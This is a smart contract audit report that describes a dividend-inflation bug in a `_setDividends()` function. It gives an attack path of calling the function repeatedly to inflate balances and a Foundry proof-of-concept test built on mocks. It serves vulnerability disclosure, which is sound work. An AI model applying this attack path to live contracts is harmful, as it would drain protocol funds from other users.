# [000913] Dividend Inflation via Repeated Invocation of `_setDividends()
  
  ### Summary

The `_setDividends()` function allows **unbounded dividend inflation** when called multiple times. It adds to `dividendsOf[owner]`, so repeated calls credit the same amount repeatedly, resulting in loss of funds from the protocol.

### Root Cause

The current implementation of [`_setDividends()`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L218):

```solidity
dividendsOf[owner] += (
    unclaimedAmountsIn[i] * stablecoinAmountToDistribute / totalUnclaimedAmounts
);
```
The function uses `+=`, but the real issue is that `_setDividends()` can be called multiple times per distribution cycle. Since `stablecoinAmountToDistribute` and `totalUnclaimedAmounts` remain constant, repeated calls add identical amounts. 

### Internal Pre-conditions

`setDividends` or `setUpTheDividends` is called more than once

### External Pre-conditions

N/A

### Attack Path

1. Trigger a new dividend distribution cycle
The attacker calls the public function that leads to _setDividends() (e.g., setDividends / setUpTheDividends) once, causing a valid 100% distribution.

2. Call the same function again before state changes
Because nothing prevents repeated invocations and the distribution parameters remain unchanged, the attacker calls it again (or multiple times). Each call re‑adds the same dividend amounts to all dividendsOf balances.

### Impact

Even without malicious intent, internal processes that accidentally call `_setDividends()` more than once will:
- Misallocate dividend distribution
- Result in loss of funds to the protocol

### PoC

I created a standalone PoC that isolates the `_setDividends` logic, because the full system has multiple interacting bugs that prevent reliably reaching this code path in its deployed form.

Add the following test suite into `test/setDividends.t.sol` and run the test 

```bash
forge clean
forge test --mt testInflation -vvvv
```

You will see that repeatedly calling `_setDividends` will result in inflation of the users dividends.

> Note: I have added a fix to `_setDividends` in the test, to skip the first NftId

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

//-------------------------------------------------------------
// Minimal NFT mock
//-------------------------------------------------------------
contract MockNFT {
    mapping(uint256 => address) public owners;
    uint256 public totalMinted;

    function mint(address to) external returns (uint256) {
        totalMinted++;
        owners[totalMinted] = to;
        return totalMinted;
    }

    function getTotalMinted() external view returns (uint256) {
        return totalMinted;
    }
}

//-------------------------------------------------------------
// Minimal ERC20 mock
//-------------------------------------------------------------
contract MockERC20 {
    mapping(address => uint256) public balances;

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
}

//-------------------------------------------------------------
// PoC Dividend Distributor
//-------------------------------------------------------------
contract POCDistributor {
    MockNFT public nft;
    MockERC20 public stablecoin;

    mapping(address => uint256) public dividendsOf;
    mapping(uint256 => uint256) public unclaimedAmountsIn;
    uint256 public totalUnclaimedAmounts;
    uint256 public stablecoinAmountToDistribute;

    constructor(address _nft, address _stablecoin) {
        nft = MockNFT(_nft);
        stablecoin = MockERC20(_stablecoin);
    }

    function setAmounts(uint256[] calldata nftIds, uint256[] calldata amounts) external {
        require(nftIds.length == amounts.length, "Length mismatch");
        stablecoinAmountToDistribute = stablecoin.balanceOf(address(this));
        totalUnclaimedAmounts = 0;
        for (uint256 i = 0; i < nftIds.length; i++) {
            unclaimedAmountsIn[nftIds[i]] = amounts[i];
            totalUnclaimedAmounts += amounts[i];
        }
    }

    function safeOwnerOf(uint256 id) public view returns (address owner, bool exists) {
        address o = nft.owners(id);
        if (o != address(0)) return (o, true);
        return (address(0), false);
    }

    function _setDividends() internal {
        uint256 len = nft.getTotalMinted();
        for (uint256 i; i < len;) {
            (address owner, bool isOwned) = safeOwnerOf(i + 1); // NFTs start at 1
            if (isOwned) {
                dividendsOf[owner] += (unclaimedAmountsIn[i + 1] * stablecoinAmountToDistribute / totalUnclaimedAmounts);
            }
            unchecked {
                ++i;
            }
        }
    }

    function callSetDividends() external {
        _setDividends();
    }
}

//-------------------------------------------------------------
// Forge test reproducing inflation
//-------------------------------------------------------------
contract DividendInflationPOCTest is Test {
    MockNFT nft;
    MockERC20 stable;
    POCDistributor dist;

    address user = address(0x123);

    function setUp() public {
        nft = new MockNFT();
        stable = new MockERC20();

        dist = new POCDistributor(address(nft), address(stable));

        // Mint multiple NFTs to user
        nft.mint(user);
        nft.mint(user);

        // Mint stablecoins to distributor
        stable.mint(address(dist), 1000);

        // Set unclaimed amounts
        uint256[] memory ids = new uint256[](2);
        ids[0] = 1;
        ids[1] = 2;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100;
        amounts[1] = 200;

        dist.setAmounts(ids, amounts);
    }

    function testInflation() public {
        // First call: initial dividends
        dist.callSetDividends();
        uint256 first = dist.dividendsOf(user);

        // Second call: dividends inflate
        dist.callSetDividends();
        uint256 second = dist.dividendsOf(user);

        // Confirm inflation
        assertGt(second, first); // PASS: second > first
    }
}
```

### Mitigation

_No response_
  